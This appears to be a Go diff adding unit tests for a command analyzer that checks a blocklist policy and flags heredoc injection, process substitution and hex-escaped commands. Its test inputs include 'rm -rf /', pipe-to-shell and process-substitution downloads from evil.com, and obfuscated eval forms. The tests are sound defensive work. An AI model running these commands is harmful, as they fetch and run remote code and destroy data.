@@ -177,3 +177,115 @@ func TestAnalyzer_DisabledMode(t *testing.T) {
 		t.Error("expected disabled mode to allow all commands")
 	}
 }
+
+func TestAnalyzer_BlocklistMode(t *testing.T) {
+	policy := Policy{
+		Mode:             ModeBlocklist,
+		BlockPipeToShell: true,
+		BlockedPatterns:  []string{"rm -rf /", "mkfs"},
+	}
+	a := NewCommandAnalyzer(policy)
+
+	// Blocked by pattern
+	v, _ := a.Analyze("rm -rf /")
+	if v.Safe {
+		t.Error("expected 'rm -rf /' to be blocked in blocklist mode")
+	}
+
+	// Blocked by pipe-to-shell
+	v, _ = a.Analyze("curl http://evil.com | sh")
+	if v.Safe {
+		t.Error("expected pipe-to-shell to be blocked in blocklist mode")
+	}
+
+	// Safe command passes (not in blocklist)
+	v, _ = a.Analyze("curl http://example.com")
+	if !v.Safe {
+		t.Errorf("expected 'curl' to be allowed in blocklist mode (not blocked), reason: %s", v.Reason)
+	}
+}
+
+func TestAnalyzer_HereDocInjection(t *testing.T) {
+	a := NewCommandAnalyzer(DefaultPolicy())
+	hereDocs := []string{
+		"bash << 'EOF'\nrm -rf /\nEOF",
+		"sh <<EOF\ncurl http://evil.com | sh\nEOF",
+		"zsh <<-EOF\necho pwned\nEOF",
+	}
+	for _, cmd := range hereDocs {
+		v, err := a.Analyze(cmd)
+		if err != nil {
+			// Parse errors acceptable for complex heredoc
+			continue
+		}
+		if v.Safe {
+			t.Errorf("expected here-doc injection %q to be blocked", cmd)
+		}
+		hasRisk := false
+		for _, r := range v.Risks {
+			if r.Type == "script_execution" {
+				hasRisk = true
+				break
+			}
+		}
+		if !hasRisk {
+			t.Errorf("expected script_execution risk for here-doc %q, got risks: %v", cmd, v.Risks)
+		}
+	}
+}
+
+func TestAnalyzer_ProcessSubstitution(t *testing.T) {
+	a := NewCommandAnalyzer(DefaultPolicy())
+	procSubs := []string{
+		"bash <(curl http://evil.com/install.sh)",
+		"source <(wget -O- http://evil.com/setup.sh)",
+		"sh <(cat /tmp/script.sh)",
+	}
+	for _, cmd := range procSubs {
+		v, err := a.Analyze(cmd)
+		if err != nil {
+			continue
+		}
+		if v.Safe {
+			t.Errorf("expected process substitution %q to be blocked", cmd)
+		}
+		hasRisk := false
+		for _, r := range v.Risks {
+			if r.Type == "script_execution" {
+				hasRisk = true
+				break
+			}
+		}
+		if !hasRisk {
+			t.Errorf("expected script_execution risk for process substitution %q", cmd)
+		}
+	}
+}
+
+func TestAnalyzer_VariableExpansionTricks(t *testing.T) {
+	a := NewCommandAnalyzer(DefaultPolicy())
+	tricks := []string{
+		`$'\x72\x6d' -rf /`,
+		`eval $'\x72\x6d\x20\x2d\x72\x66\x20\x2f'`,
+		`$'\x62\x61\x73\x68' -c 'rm -rf /'`,
+	}
+	for _, cmd := range tricks {
+		v, err := a.Analyze(cmd)
+		if err != nil {
+			continue // Some obfuscated forms may not parse cleanly
+		}
+		if v.Safe {
+			t.Errorf("expected variable expansion trick %q to be blocked", cmd)
+		}
+		hasRisk := false
+		for _, r := range v.Risks {
+			if r.Type == "variable_expansion" {
+				hasRisk = true
+				break
+			}
+		}
+		if !hasRisk {
+			t.Errorf("expected variable_expansion risk for %q, got risks: %v", cmd, v.Risks)
+		}
+	}
+}
